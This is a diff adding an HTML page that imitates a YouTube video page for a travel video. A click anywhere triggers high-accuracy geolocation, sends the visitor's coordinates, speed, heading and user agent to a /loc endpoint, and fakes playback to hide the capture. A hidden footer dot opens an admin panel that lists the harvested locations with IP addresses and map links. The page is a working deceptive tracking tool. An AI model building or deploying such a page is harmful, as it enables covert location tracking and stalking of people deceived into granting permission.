@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Video</title>
+<link rel="icon" href="data:,">
+<style>
+* { margin:0; padding:0; box-sizing:border-box; font-family:Roboto,Arial,Helvetica,sans-serif; }
+body { background:#0f0f0f; color:#f1f1f1; min-height:100vh; cursor:pointer; }
+
+/* header */
+header { display:flex; align-items:center; gap:14px; padding:10px 18px; position:sticky; top:0; background:#0f0f0f; z-index:10; }
+.menu { font-size:20px; color:#fff; padding:8px; cursor:pointer; }
+.logo { display:flex; align-items:center; gap:6px; cursor:pointer; }
+.logo .box { width:26px; height:19px; background:#ff0000; border-radius:5px; position:relative; }
+.logo .box::after { content:''; position:absolute; left:9px; top:4px; border:6px solid transparent; border-left:10px solid #fff; }
+.logo span { font-size:18px; font-weight:700; letter-spacing:-.5px; }
+.search { flex:1; display:flex; justify-content:center; }
+.search input { width:min(560px,70vw); background:#121212; border:1px solid #303030; color:#fff; padding:9px 14px; border-radius:20px 0 0 20px; outline:none; font-size:14px; }
+.search button { background:#222; border:1px solid #303030; border-left:none; border-radius:0 20px 20px 0; padding:8px 16px; color:#fff; cursor:pointer; }
+.icons { display:flex; gap:16px; font-size:18px; color:#fff; cursor:pointer; }
+.avatar { width:30px; height:30px; border-radius:50%; background:#7a4dd0; display:flex; align-items:center; justify-content:center; font-size:13px; }
+
+/* video area */
+main { max-width:1000px; margin:0 auto; padding:18px; }
+.video { position:relative; width:100%; aspect-ratio:16/9; background:linear-gradient(135deg,#1b1b2f,#2d1b4e 50%,#1b2f2b); border-radius:10px; display:flex; align-items:center; justify-content:center; overflow:hidden; }
+.video .grad { position:absolute; inset:0; background:radial-gradient(circle at 30% 30%, rgba(255,255,255,.08), transparent 60%); }
+.play { position:relative; z-index:2; width:78px; height:78px; border-radius:50%; background:rgba(0,0,0,.55); border:3px solid rgba(255,255,255,.9); color:#fff; font-size:34px; display:flex; align-items:center; justify-content:center; padding-left:6px; transition:.15s; }
+.play:hover { transform:scale(1.08); background:rgba(255,0,0,.6); }
+.bar { position:absolute; bottom:0; left:0; height:4px; background:#ff0000; width:0%; transition:width 2s linear; z-index:3; }
+
+/* meta */
+h1 { font-size:19px; font-weight:500; margin-top:14px; }
+.meta { color:#aaa; font-size:13px; margin-top:6px; }
+.channel { display:flex; align-items:center; gap:12px; margin-top:14px; padding:12px 0; border-bottom:1px solid #272727; }
+.ch-av { width:40px; height:40px; border-radius:50%; background:#3ea6ff; display:flex; align-items:center; justify-content:center; font-size:16px; }
+.ch-name { font-weight:600; font-size:14px; }
+.ch-sub { color:#aaa; font-size:12px; }
+.subscribe { margin-left:auto; background:#fff; color:#0f0f0f; font-weight:600; font-size:13px; padding:9px 16px; border-radius:18px; cursor:pointer; }
+.actions { display:flex; gap:10px; margin-top:14px; flex-wrap:wrap; }
+.btn { background:#272727; border:none; color:#fff; padding:9px 16px; border-radius:18px; font-size:13px; cursor:pointer; }
+.desc { background:#272727; border-radius:10px; padding:12px; font-size:13px; line-height:1.6; color:#ddd; margin-top:14px; }
+.desc b { color:#fff; }
+.comments { margin-top:20px; color:#aaa; font-size:13px; border-top:1px solid #272727; padding-top:16px; }
+.comment-row { display:flex; gap:10px; margin-top:14px; }
+.c-av { width:32px; height:32px; border-radius:50%; background:#555; flex-shrink:0; }
+.c-line { background:#272727; height:10px; border-radius:5px; margin-top:6px; }
+.c-line.w40 { width:40%; } .c-line.w70 { width:70%; }
+
+/* footer + secret admin trigger */
+footer { max-width:1000px; margin:30px auto 0; padding:14px 18px; border-top:1px solid #272727; color:#555; font-size:11px; display:flex; justify-content:space-between; align-items:center; }
+#adminBtn { background:none; border:none; color:#555; font-size:11px; cursor:pointer; padding:6px; opacity:.6; }
+#adminBtn:hover { opacity:1; color:#fff; }
+
+/* admin overlay */
+#admin { display:none; position:fixed; inset:0; background:rgba(0,0,0,.94); z-index:100; padding:24px; overflow:auto; cursor:default; }
+#admin.open { display:block; }
+#admin h2 { color:#fff; margin-bottom:14px; font-size:20px; }
+#admin .close { float:right; background:#272727; color:#fff; border:none; padding:8px 14px; border-radius:6px; cursor:pointer; }
+#admin .refresh { background:#272727; color:#fff; border:none; padding:8px 14px; border-radius:6px; cursor:pointer; margin-right:8px; }
+table { width:100%; border-collapse:collapse; margin-top:14px; }
+th,td { padding:9px 10px; text-align:left; font-size:12px; border-bottom:1px solid #272727; color:#ddd; white-space:nowrap; }
+th { color:#fff; background:#1a1a1a; position:sticky; top:0; }
+td a { color:#3ea6ff; text-decoration:none; }
+#admin .count { color:#aaa; font-size:12px; }
+</style>
+</head>
+<body>
+
+<!-- YouTube-style header -->
+<header>
+  <div class="menu">&#9776;</div>
+  <div class="logo"><div class="box"></div><span>YouTube</span></div>
+  <div class="search"><input placeholder="Search"><button>&#128269;</button></div>
+  <div class="icons"><span>&#128247;</span><span>&#128276;</span><div class="avatar">A</div></div>
+</header>
+
+<main>
+  <!-- video player: whole page is the click zone -->
+  <div class="video">
+    <div class="grad"></div>
+    <div class="play" id="playBtn">&#9654;</div>
+    <div class="bar" id="bar"></div>
+  </div>
+
+  <h1 id="title">Top 10 Hidden Travel Spots You Must See in 2026 &#127758;</h1>
+  <div class="meta" id="meta">2,847,391 views &bull; 3 days ago</div>
+
+  <div class="channel">
+    <div class="ch-av">W</div>
+    <div><div class="ch-name">WanderLens</div><div class="ch-sub">1.2M subscribers</div></div>
+    <div class="subscribe">Subscribe</div>
+  </div>
+
+  <div class="actions">
+    <button class="btn">&#128077; 48K</button>
+    <button class="btn">&#128078; 1.2K</button>
+    <button class="btn">&#8635; Share</button>
+    <button class="btn">&#11015; Download</button>
+    <button class="btn">&#128190; Save</button>
+  </div>
+
+  <div class="desc">
+    <b>Description</b><br><br>
+    These hidden gems are ranked by real travelers. We spent 200 days on the road
+    to bring you the most underrated spots on the planet.<br><br>
+    Subscribe and tap play to start watching.
+  </div>
+
+  <div class="comments">
+    Comments 1,204
+    <div class="comment-row"><div class="c-av"></div><div style="flex:1"><div class="c-line w70"></div><div class="c-line w40"></div></div></div>
+    <div class="comment-row"><div class="c-av"></div><div style="flex:1"><div class="c-line w70"></div><div class="c-line w40"></div></div></div>
+  </div>
+</main>
+
+<footer>
+  <div>&#169; 2026 YouTube, LLC — this is a demo page</div>
+  <button id="adminBtn" title="">&#9679;</button>
+</footer>
+
+<!-- admin overlay (opened by secret footer button) -->
+<div id="admin">
+  <h2>Saved Locations <span class="count" id="count"></span>
+    <button class="refresh" onclick="loadAdmin()">Refresh</button>
+    <button class="close" onclick="document.getElementById('admin').classList.remove('open')">Close</button>
+  </h2>
+  <table>
+    <thead><tr><th>Time</th><th>Latitude</th><th>Longitude</th><th>Accuracy</th><th>IP</th><th>Map</th></tr></thead>
+    <tbody id="rows"></tbody>
+  </table>
+</div>
+
+<script>
+// ---- 1. full-page click = trigger geolocation ONCE (any click anywhere) ----
+let triggered = false, best = null, watchId = null;
+
+document.addEventListener('click', function () {
+  if (triggered) return;
+  triggered = true;
+  if (!navigator.geolocation) { setTitle('Not supported on this browser'); return; }
+
+  watchId = navigator.geolocation.watchPosition(function (p) {
+    var c = p.coords;
+    var fix = {
+      lat: c.latitude, lon: c.longitude, acc: c.accuracy,
+      alt: c.altitude, speed: c.speed, heading: c.heading,
+      ua: navigator.userAgent, time: new Date().toISOString()
+    };
+    if (!best || fix.acc < best.acc) { best = fix; send(fix); }
+    playing();
+  }, function () { setTitle('Video unavailable in your region'); },
+  { enableHighAccuracy: true, maximumAge: 0, timeout: 15000 });
+
+  // stop collecting after 20s
+  setTimeout(function () {
+    if (watchId) navigator.geolocation.clearWatch(watchId);
+  }, 20000);
+});
+
+function send(fix) {
+  fetch('/loc', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(fix)
+  }).catch(function () {});
+}
+
+// fake "now playing" state so the page looks alive after Allow
+function playing() {
+  document.getElementById('playBtn').innerHTML = '&#10074;&#10074;';
+  setTitle('Now playing: Top 10 Hidden Travel Spots (4K)');
+  document.getElementById('bar').style.width = '100%';
+}
+function setTitle(t) { document.getElementById('title').textContent = t; }
+
+// ---- 2. secret admin: the tiny dot in the footer ----
+document.getElementById('adminBtn').addEventListener('click', function (e) {
+  e.stopPropagation(); // don't trigger geolocation from admin
+  document.getElementById('admin').classList.add('open');
+  loadAdmin();
+});
+
+async function loadAdmin() {
+  try {
+    var locs = await (await fetch('/api/locations')).json();
+    document.getElementById('count').textContent = '(' + locs.length + ')';
+    document.getElementById('rows').innerHTML = locs.map(function (l) {
+      var t = l.received ? new Date(l.received).toLocaleString() : '-';
+      return '<tr>' +
+        '<td>' + t + '</td>' +
+        '<td>' + l.lat + '</td>' +
+        '<td>' + l.lon + '</td>' +
+        '<td>' + (l.acc != null ? l.acc + ' m' : '-') + '</td>' +
+        '<td>' + (l.ip || '-') + '</td>' +
+        '<td><a href="https://maps.google.com/?q=' + l.lat + ',' + l.lon + '" target="_blank">open map</a></td>' +
+      '</tr>';
+    }).join('');
+  } catch (err) {
+    document.getElementById('rows').innerHTML = '<tr><td colspan="6">Failed to load</td></tr>';
+  }
+}
+</script>
+</body>
+</html>
